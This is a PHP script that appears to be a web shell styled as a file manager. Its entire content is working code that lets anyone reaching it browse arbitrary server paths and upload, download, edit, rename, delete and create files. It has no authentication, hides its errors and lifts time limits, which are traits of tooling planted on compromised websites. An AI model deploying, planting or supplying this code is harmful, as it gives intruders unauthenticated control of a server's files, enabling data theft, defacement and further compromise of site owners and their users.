<?php
@set_time_limit(0);
@error_reporting(0);

$path = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$path = realpath($path);

function h($s) { return htmlspecialchars($s, ENT_QUOTES); }

if (isset($_GET['cd'])) {
    $new = realpath($path . '/' . $_GET['cd']);
    if (is_dir($new)) {
        header("Location: ?path=" . urlencode($new));
        exit;
    }
}

if (isset($_GET['del'])) {
    $target = realpath($path . '/' . $_GET['del']);
    if (is_file($target)) unlink($target);
    if (is_dir($target)) @rmdir($target);
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_GET['dl'])) {
    $target = realpath($path . '/' . $_GET['dl']);
    if (is_file($target)) {
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"" . basename($target) . "\"");
        readfile($target);
        exit;
    }
}

if (isset($_GET['edit'])) {
    $file = realpath($path . '/' . $_GET['edit']);
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($file, $_POST['content']);
        header("Location: ?path=" . urlencode($path));
        exit;
    }
    echo "<style>
            body { font-family: monospace; background: #111; color: #ddd; }
            textarea { width: 100%; height: 80vh; background: #222; color: #0f0; border: none; padding: 10px; }
            input[type=submit] { padding: 8px; background: #0f0; color: #000; border: none; font-weight: bold; }
          </style>";
    echo "<h3>Editing: " . h($file) . "</h3>";
    echo "<form method='POST'>
            <textarea name='content'>" . h(file_get_contents($file)) . "</textarea><br>
            <input type='submit' value='Save File'>
          </form>";
    exit;
}

if (isset($_GET['rename'])) {
    $old = realpath($path . '/' . $_GET['rename']);
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $new = $path . '/' . $_POST['newname'];
        rename($old, $new);
        header("Location: ?path=" . urlencode($path));
        exit;
    }
    echo "<form method='POST'>
            <input type='text' name='newname' value='" . h(basename($old)) . "'>
            <input type='submit' value='Rename'>
          </form>";
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name']);
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['newfolder'])) {
    mkdir($path . '/' . $_POST['newfolder']);
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['newfile'])) {
    file_put_contents($path . '/' . $_POST['newfile'], "");
    header("Location: ?path=" . urlencode($path));
    exit;
}

echo "<style>
        body { font-family: monospace; background: #111; color: #ddd; }
        a { color: #0f0; text-decoration: none; }
        table { width: 100%; border-collapse: collapse; }
        td, th { padding: 6px; border-bottom: 1px solid #333; }
        input, button { background: #0f0; color: #000; border: none; padding: 5px; }
        form { display: inline; }
      </style>";

echo "<h3>Path: $path</h3>";

$parts = explode(DIRECTORY_SEPARATOR, $path);
$crumb = '';
foreach ($parts as $part) {
    if ($part === '') continue;
    $crumb .= DIRECTORY_SEPARATOR . $part;
    echo "<a href='?path=" . urlencode($crumb) . "'>/" . h($part) . "</a>";
}
echo "<br><br>";

echo "<form method='POST' enctype='multipart/form-data'>
        <input type='file' name='file'>
        <input type='submit' value='Upload'>
      </form> ";

echo "<form method='POST'>
        <input type='text' name='newfolder' placeholder='New Folder'>
        <input type='submit' value='Create'>
      </form> ";

echo "<form method='POST'>
        <input type='text' name='newfile' placeholder='New File'>
        <input type='submit' value='Create'>
      </form><br><br>";

echo "<table>
        <tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr>";

foreach (scandir($path) as $item) {
    if ($item === ".") continue;
    $full = $path . '/' . $item;
    $type = is_dir($full) ? 'DIR' : 'FILE';
    $size = is_dir($full) ? '-' : filesize($full);
    echo "<tr>
            <td>" . ($type === 'DIR' ? "<a href='?path=" . urlencode($full) . "'>$item</a>" : h($item)) . "</td>
            <td>$type</td>
            <td>$size</td>
            <td>
                " . ($type === 'FILE' ? "<a href='?path=" . urlencode($path) . "&dl=" . urlencode($item) . "'>DL</a> | " : "") . "
                <a href='?path=" . urlencode($path) . "&edit=" . urlencode($item) . "'>EDIT</a> |
                <a href='?path=" . urlencode($path) . "&rename=" . urlencode($item) . "'>RENAME</a> |
                <a href='?path=" . urlencode($path) . "&del=" . urlencode($item) . "' onclick='return confirm(\"Delete?\")'>DEL</a>
            </td>
          </tr>";
}
echo "</table>";
